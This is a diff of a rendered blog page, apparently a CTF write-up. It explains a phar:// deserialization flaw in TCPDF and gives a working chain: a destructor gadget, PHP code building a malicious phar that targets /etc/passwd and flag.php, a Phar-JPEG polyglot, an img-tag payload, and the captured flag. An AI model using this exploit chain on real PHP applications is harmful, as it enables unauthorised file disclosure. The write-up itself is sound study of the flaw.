@@ -93,7 +93,7 @@
 <script>$(document).on('click', function () { $('.collapse').collapse('hide'); })</script>
 
 
-<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.85.0" />
+<script src="/js/confetti.browser.js"></script> <meta name="generator" content="Hugo 0.96.0" />
     
 
     
@@ -324,7 +324,7 @@
 <p>An example of such a dangerous thing can be executing <code>system()</code> on an object attribute value. An attacker could therefore upload a malicious <code>phar</code> file that contains a malicious shell command as a value of one of the string attributes. After causing the <code>phar</code> to be deserialized, the destructor is called which in turn executes <code>system()</code> with the attacker-supplied command as argument.</p>
 <h1 id="insecure-phar-handling-in-tcpdf">Insecure phar:// Handling in TCPDF</h1>
 <p>The essence of the TCPDF vulnerability is that user-supplied <code>&lt;img&gt;</code> tags are handled in a way that allows an attacker to reach a call to <code>file_exists</code> in the vulnerable library. There are various file system functions that cause <code>phar</code>s to be deserialized, and of course this one is among them. This can be exploited using an attacker-controlled parameter that references a file path with the <code>phar://</code> handler. Consider the following example in the context of TCPDF:</p>
-<pre><code>&lt;img src=&quot;phar://upload/hax.phar&quot;&gt;
+<pre tabindex="0"><code>&lt;img src=&#34;phar://upload/hax.phar&#34;&gt;
 </code></pre><p>Upon entering this line in the web applications HTML input textbox, the following things happen:</p>
 <ul>
 <li>The web application parses the <code>&lt;img&gt;</code> tag in <code>openHTMLTagHandler()</code>. This function internally makes a call to <code>Image()</code> with the first parameter being the user-supplied file path of the image, including the <code>phar://</code> wrapper.</li>
@@ -338,18 +338,18 @@
 <p>The first thing that&rsquo;s required for this to work is a fitting gadget. There&rsquo;s a nice toolkit for this that&rsquo;s called <a href="https://github.com/ambionics/phpggc">phpggc</a>. Unfortunately, the gadgets included in this tool can&rsquo;t be used to exploit the target but it serves as a good example of how do pull this attack off.</p>
 <h2 id="finding-a-gadget">Finding A Gadget</h2>
 <p>After doing some research it became clear that TCPDF doesn&rsquo;t contain a fitting gadget, so I decided to check out the web applications itself and not just the vulnerable library. After some really thorough analysis (really 1337 <code>grep</code>), the contents <code>creator.php</code> file were found to be suspicious. It contains a class called <code>PDFCreator</code> that also has its own destructor:</p>
-<pre><code>function __destruct()
+<pre tabindex="0"><code>function __destruct()
 {
     if (file_exists($this-&gt;tmpfile))
     {
     $info = pathinfo($this-&gt;tmpfile);
-    if ($info['extension'] == &quot;pdf&quot;)
+    if ($info[&#39;extension&#39;] == &#34;pdf&#34;)
     {
         unlink($this-&gt;tmpfile);
     }
     else
     {
-        echo &quot;Could not delete created PDF: Not a pdf. Check the file: &quot; . file_get_contents($this-&gt;tmpfile);
+        echo &#34;Could not delete created PDF: Not a pdf. Check the file: &#34; . file_get_contents($this-&gt;tmpfile);
     }
     }
 }
@@ -357,18 +357,18 @@
 <p>Please note that gadgets of this kind can also exist in any third party library that a web application is using internally.</p>
 <h2 id="constructing-the-phar">Constructing The Phar</h2>
 <p>First it&rsquo;s required to create a <code>php.ini</code> file with this content:</p>
-<pre><code>[phar]
+<pre tabindex="0"><code>[phar]
 phar.readonly = 0
 </code></pre><p>By default this setting is set to <code>1</code> which prevents creating <code>phar</code> files.</p>
 <p>Consider this PHP listing that can be used to create a <code>phar</code> that can be deserialized by the target web application:</p>
-<pre><code>&lt;?php
+<pre tabindex="0"><code>&lt;?php
 namespace PDFStuff {
 
-  class PDFCreator { public $tmpfile = &quot;/etc/passwd&quot;; }
+  class PDFCreator { public $tmpfile = &#34;/etc/passwd&#34;; }
 
-  $phar = new \Phar(&quot;test.phar&quot;);
+  $phar = new \Phar(&#34;test.phar&#34;);
   $phar-&gt;startBuffering();
-  $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER();&quot;);
+  $phar-&gt;setStub(&#34;&lt;?php __HALT_COMPILER();&#34;);
 
   # Setting the metadata serializes the payload object
   $payload = new PDFCreator();
@@ -376,23 +376,23 @@ namespace PDFStuff {
   $phar-&gt;setMetadata($payload);
 
   # Add a dummy file to respect the Phar specifications
-  $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+  $phar-&gt;addFromString(&#34;test.txt&#34;, &#34;test&#34;);
   $phar-&gt;stopBuffering();
 }
 </code></pre><p>This is a modified version of the <code>phar</code> creator that can be found in the <a href="https://www.ixiacom.com/company/blog/exploiting-php-phar-deserialization-vulnerabilities-part-2">second part of Daniel Timofte&rsquo;s great blog post</a>.</p>
 <p>PHP saves objects in <code>phar</code> files according to their namespaces and class names. This means that in order to allow correct deserialization on the target server, the original namespace and class names have to be used for the malicious serialized object. This is why the whole code is wrapped in the correct namespace, as determined using the provided source code.</p>
 <p>Another interesting thing is that we only need to provide the correct names and attributes for the deserialization to work on the other end. No unnecessary other attributes or imports are required.</p>
 <p>Calling</p>
-<pre><code>php -c php.ini creator.php
+<pre tabindex="0"><code>php -c php.ini creator.php
 </code></pre><p>yields a <code>test.phar</code> that contains the crafted object. After commenting out the file type and exif checks on a local instance of the target web application, this has been found to work perfectly.</p>
 <h2 id="making-a-phar-jpeg-polyglot">Making A Phar-JPEG Polyglot</h2>
 <p>The only missing thing is that the created <code>phar</code> is in fact not a valid picture file. Therefore this file will be rejected by the target server and can&rsquo;t be uploaded this way.</p>
 <p>The talk mentioned before also contains information on Phar-JPEG polyglot files. These are files that seem to be images but in fact they embed valid <code>phar</code> file inside. This can be built manually or using <a href="https://github.com/kunte0/phar-jpg-polyglot">this great tool</a>. I&rsquo;ve used the latter with some slight modifications to make it work with the custom gadget. Of course, <code>$tmpfile</code> has been set to <code>'./flag.php'</code> to get the flag.</p>
 <h1 id="getting-the-flag">Getting The Flag</h1>
 <p>After uploading the flag and modifying the HML to include</p>
-<pre><code>&lt;img src=&quot;phar://upload/&lt;filename&gt;.jpg&quot;&gt;
+<pre tabindex="0"><code>&lt;img src=&#34;phar://upload/&lt;filename&gt;.jpg&#34;&gt;
 </code></pre><p>the flag can be found in the HTML source code:</p>
-<pre><code>$flag = &quot;ALLES{phar_jpeg_polyglot_madness_such_w0w}&quot;
+<pre tabindex="0"><code>$flag = &#34;ALLES{phar_jpeg_polyglot_madness_such_w0w}&#34;
 </code></pre><p>Peace out, thanks to <a href="https://twitter.com/allesctf">ALLES CTF</a> and 0x4d5a for this challenge :)</p>
 </div>
 
